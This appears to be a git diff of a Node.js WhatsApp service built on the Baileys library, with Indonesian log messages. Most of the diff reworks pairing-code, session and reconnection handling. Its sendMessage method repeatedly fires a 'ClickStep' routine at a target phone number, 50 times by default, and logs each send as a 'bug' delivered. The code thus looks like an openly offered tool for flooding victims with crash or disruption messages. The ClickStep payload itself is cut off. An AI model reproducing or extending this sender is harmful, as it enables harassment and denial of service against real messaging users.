@@ -9,8 +9,9 @@ const {
   relayWAMessage,
   getContentType,
   jidDecode,
-  Browsers
+  fetchLatestBaileysVersion
 } = require('@whiskeysockets/baileys');
+const { Boom } = require('@hapi/boom');
 const fs = require('fs-extra');
 const path = require('path');
 
@@ -19,11 +20,9 @@ class WhatsAppService {
         this.sock = null;
         this.pairingCode = null;
         this.isConnected = false;
-        this.authPath = path.join(__dirname, '../auth');
+        this.authPath = path.join(__dirname, '../session');
         this.phoneNumber = null;
         this.isInitializing = false;
-        this.connectionRetries = 0;
-        this.maxRetries = 3;
         this.ensureAuthDir();
     }
 
@@ -33,220 +32,130 @@ class WhatsAppService {
         }
     }
 
-    formatPhoneNumber(phoneNumber) {
-        if (!phoneNumber) return null;
-        
-        let cleanNumber = phoneNumber.toString().replace(/\D/g, '');
-        
-        if (cleanNumber.startsWith('0')) {
-            cleanNumber = cleanNumber.substring(1);
-        }
-        
-        if (!cleanNumber.startsWith('62')) {
-            cleanNumber = '62' + cleanNumber;
-        }
-        
-        if (cleanNumber.length < 12 || cleanNumber.length > 17) {
-            throw new Error(`Format nomor tidak valid: ${cleanNumber}. Harus 10-15 digit setelah +62`);
-        }
-        
-        return cleanNumber;
-    }
-
-    async initialize(phoneNumber = null) {
+    async initialize(phoneNumber) {
         if (this.isInitializing) {
-            console.log('WhatsApp already initializing, please wait...');
-            return false;
+            console.log('Already initializing...');
+            return;
         }
 
         try {
             this.isInitializing = true;
-            
-            if (phoneNumber) {
-                this.phoneNumber = this.formatPhoneNumber(phoneNumber);
-                console.log(`Initializing WhatsApp for: ${this.phoneNumber}`);
-            }
+            this.phoneNumber = phoneNumber;
             
             const { state, saveCreds } = await useMultiFileAuthState(this.authPath);
+            const { version, isLatest } = await fetchLatestBaileysVersion();
             
-            if (this.sock) {
-                try {
-                    await this.sock.end();
-                } catch (err) {
-                    console.log('Error closing existing socket:', err.message);
-                }
-            }
+            console.log(`Using Baileys version: ${version}, isLatest: ${isLatest}`);
             
             this.sock = makeWASocket({
-                auth: state,
-                printQRInTerminal: false,
                 logger: require('pino')({ level: 'silent' }),
-                browser: Browsers.macOS('Desktop'),
-                mobile: false,
-                syncFullHistory: false,
-                markOnlineOnConnect: false,
-                emitOwnEvents: false,
-                generateHighQualityLinkPreview: false,
-                defaultQueryTimeoutMs: 20000,
-                connectTimeoutMs: 20000,
-                keepAliveIntervalMs: 30000,
-                retryRequestDelayMs: 1000,
-                maxMsgRetryCount: 2,
-                fireInitQueries: true,
-                qrTimeout: 30000
+                printQRInTerminal: false,
+                auth: state,
+                browser: ["Ubuntu", "Chrome", "20.0.04"],
+                version: version
             });
 
             this.setupEventHandlers(saveCreds);
 
-            await this.waitForSocketReady();
+            await delay(2000);
 
-            if (this.phoneNumber && !state.creds?.registered) {
+            if (!state.creds?.registered && phoneNumber) {
                 console.log('Device not registered, requesting pairing code...');
-                this.pairingCode = await this.sock.requestPairingCode(this.phoneNumber);
-                console.log(`Pairing code for ${this.phoneNumber}: ${this.pairingCode}`);
-                return this.pairingCode;
-            } else if (state.creds?.registered) {
-                console.log('Device already registered, waiting for connection...');
+                this.pairingCode = await this.sock.requestPairingCode(phoneNumber, "NOCTURNE");
+                console.log(`Pairing code for ${phoneNumber}: ${this.pairingCode}`);
             }
-
-            return true;
 
         } catch (error) {
             console.error('WhatsApp initialization error:', error);
-            this.connectionRetries++;
-            
-            if (this.connectionRetries < this.maxRetries) {
-                console.log(`Retrying initialization... (${this.connectionRetries}/${this.maxRetries})`);
-                await delay(5000);
-                return this.initialize(phoneNumber);
-            }
-            
             throw error;
         } finally {
             this.isInitializing = false;
         }
     }
 
-    async waitForSocketReady(timeout = 10000) {
-        return new Promise((resolve, reject) => {
-            if (!this.sock) {
-                reject(new Error('Socket not initialized'));
-                return;
-            }
-
-            const timer = setTimeout(() => {
-                reject(new Error('Socket ready timeout'));
-            }, timeout);
-
-            if (this.sock.authState && this.sock.authState.creds) {
-                clearTimeout(timer);
-                resolve(true);
-                return;
-            }
-
-            const checkReady = () => {
-                if (this.sock && this.sock.authState && this.sock.authState.creds) {
-                    clearTimeout(timer);
-                    resolve(true);
-                } else {
-                    setTimeout(checkReady, 500);
-                }
-            };
-
-            checkReady();
-        });
-    }
-
     setupEventHandlers(saveCreds) {
-        if (!this.sock) return;
-
         this.sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect, qr } = update;
-            
-            console.log('Connection update:', connection);
+            const { connection, lastDisconnect } = update;
             
             if (connection === 'close') {
+                let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+                
+                if (reason === DisconnectReason.badSession) {
+                    console.log('Bad Session File, Please Delete session and Scan Again');
+                    await this.clearSession();
+                } else if (reason === DisconnectReason.connectionClosed) {
+                    console.log('Connection closed, reconnecting....');
+                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
+                } else if (reason === DisconnectReason.connectionLost) {
+                    console.log('Connection Lost from Server, reconnecting...');
+                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
+                } else if (reason === DisconnectReason.connectionReplaced) {
+                    console.log('Connection Replaced, Another New Session Opened, Please Close Current Session First');
+                } else if (reason === DisconnectReason.loggedOut) {
+                    console.log('Device Logged Out, Please Scan Again And Run.');
+                    await this.clearSession();
+                } else if (reason === DisconnectReason.restartRequired) {
+                    console.log('Restart Required, Restarting...');
+                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
+                } else if (reason === DisconnectReason.timedOut) {
+                    console.log('Connection TimedOut, Reconnecting...');
+                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
+                } else if (reason === DisconnectReason.Multidevicemismatch) {
+                    console.log('Multi device mismatch, please scan again');
+                    await this.clearSession();
+                } else {
+                    console.log('Unknown DisconnectReason: ' + reason + '|' + connection);
+                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
+                }
+                
                 this.isConnected = false;
                 this.pairingCode = null;
                 
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                const shouldReconnect = statusCode !== DisconnectReason.loggedOut && 
-                                      statusCode !== DisconnectReason.forbidden &&
-                                      this.connectionRetries < this.maxRetries;
-                
-                console.log('Connection closed:', {
-                    error: lastDisconnect?.error?.message,
-                    statusCode,
-                    shouldReconnect
-                });
-                
-                if (shouldReconnect && !this.isInitializing) {
-                    console.log(`Reconnecting in 5 seconds... (${this.connectionRetries + 1}/${this.maxRetries})`);
-                    setTimeout(() => {
-                        if (this.phoneNumber) {
-                            this.initialize(this.phoneNumber);
-                        }
-                    }, 5000);
-                } else if (statusCode === DisconnectReason.loggedOut) {
-                    console.log('Logged out, cleaning auth state...');
-                    this.clearAuthState();
-                }
             } else if (connection === 'open') {
-                console.log('WhatsApp connection opened successfully!');
+                console.log('WhatsApp connection opened successfully');
                 this.isConnected = true;
                 this.pairingCode = null;
-                this.connectionRetries = 0;
-            } else if (connection === 'connecting') {
-                console.log('Connecting to WhatsApp...');
             }
         });
 
         this.sock.ev.on('creds.update', saveCreds);
-
+        
         this.sock.ev.on('messages.upsert', (m) => {
+           
         });
     }
 
-    async requestPairingCode(phoneNumber) {
+    async clearSession() {
         try {
-            if (this.isConnected) {
-                throw new Error('WhatsApp sudah terhubung');
+            if (fs.existsSync(this.authPath)) {
+                await fs.emptyDir(this.authPath);
+                console.log('Session cleared');
             }
-            
-            if (!phoneNumber) {
-                throw new Error('Nomor telepon diperlukan untuk pairing code');
-            }
-            
-            const formattedNumber = this.formatPhoneNumber(phoneNumber);
-            console.log(`Requesting pairing code for: ${formattedNumber}`);
-            
-            this.connectionRetries = 0;
-            
-            const result = await this.initialize(formattedNumber);
-            
-            if (typeof result === 'string') {
+        } catch (error) {
+            console.error('Error clearing session:', error);
+        }
+    }
 
-                return result;
-            }
-            
-            let attempts = 0;
-            const maxAttempts = 15; 
-            
-            while (!this.pairingCode && attempts < maxAttempts && this.sock) {
-                await delay(1000);
-                attempts++;
-                console.log(`Waiting for pairing code... ${attempts}/${maxAttempts}`);
-            }
-            
-            if (!this.pairingCode) {
-                throw new Error(`Gagal mendapatkan pairing code setelah ${maxAttempts} detik. Periksa nomor telepon dan koneksi.`);
+    async requestPairingCode(phoneNumber) {
+        if (this.isConnected) {
+            throw new Error('WhatsApp sudah terhubung');
+        }
+        
+        if (!phoneNumber) {
+            throw new Error('Nomor telepon diperlukan untuk pairing code');
+        }
+        
+        const cleanNumber = phoneNumber.replace(/\D/g, '');
+        
+        try {
+            if (!this.sock) {
+                await this.initialize(cleanNumber);
+                await delay(3000);
             }
             
             return this.pairingCode;
-            
         } catch (error) {
             console.error('Pairing code request error:', error);
-            this.cleanup();
             throw error;
         }
     }
@@ -257,34 +166,8 @@ class WhatsAppService {
             hasPairingCode: !!this.pairingCode,
             pairingCode: this.pairingCode,
             phoneNumber: this.phoneNumber,
-            isInitializing: this.isInitializing,
-            retries: this.connectionRetries
+            isInitializing: this.isInitializing
         };
-    }
-
-    async clearAuthState() {
-        try {
-            if (fs.existsSync(this.authPath)) {
-                await fs.emptyDir(this.authPath);
-                console.log('Auth state cleared');
-            }
-        } catch (error) {
-            console.error('Error clearing auth state:', error);
-        }
-    }
-
-    async cleanup() {
-        try {
-            this.isInitializing = false;
-            if (this.sock) {
-                await this.sock.end();
-                this.sock = null;
-            }
-            this.isConnected = false;
-            this.pairingCode = null;
-        } catch (error) {
-            console.error('Cleanup error:', error);
-        }
     }
 
     async sendMessage(target, version, customMessage, count = 50, delayMs = 1000) {
@@ -293,12 +176,20 @@ class WhatsAppService {
         }
 
         try {
-            const formattedTarget = this.formatPhoneNumber(target) + '@s.whatsapp.net';
+            let phoneNumber = target.replace(/\D/g, '');
+            if (!phoneNumber.startsWith('62')) {
+                if (phoneNumber.startsWith('0')) {
+                    phoneNumber = '62' + phoneNumber.slice(1);
+                } else {
+                    phoneNumber = '62' + phoneNumber;
+                }
+            }
+            phoneNumber += '@s.whatsapp.net';
 
             const messageFunctions = {
-                v1: () => this.ClickStep(formattedTarget),
-                v2: () => this.ClickStep(formattedTarget),
-                v3: () => this.ClickStep(formattedTarget)
+                v1: () => this.ClickStep(phoneNumber),
+                v2: () => this.ClickStep(phoneNumber),
+                v3: () => this.ClickStep(phoneNumber)
             };
 
             const messageFunction = messageFunctions[version] || messageFunctions.v1;
@@ -306,7 +197,7 @@ class WhatsAppService {
             for (let i = 1; i <= count; i++) {
                 try {
                     await messageFunction();
-                    console.log(`[${i}/${count}] Bug terkirim ke ${formattedTarget}`);
+                    console.log(`[${i}/${count}] Bug terkirim ke ${phoneNumber}`);
                     if (i < count) await delay(delayMs);
                 } catch (err) {
                     console.error(`Gagal kirim bug ke-${i}:`, err.message);
@@ -316,7 +207,7 @@ class WhatsAppService {
             return {
                 success: true,
                 message: `${count} pesan bug berhasil dikirim`,
-                target: formattedTarget,
+                target: phoneNumber,
                 version: version,
                 sentAt: new Date().toISOString()
             };
@@ -330,7 +221,8 @@ class WhatsAppService {
         }
     }
 
-    // x
+// ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ
+
     async ClickStep(isTarget) {
         try {
             const msgi = {
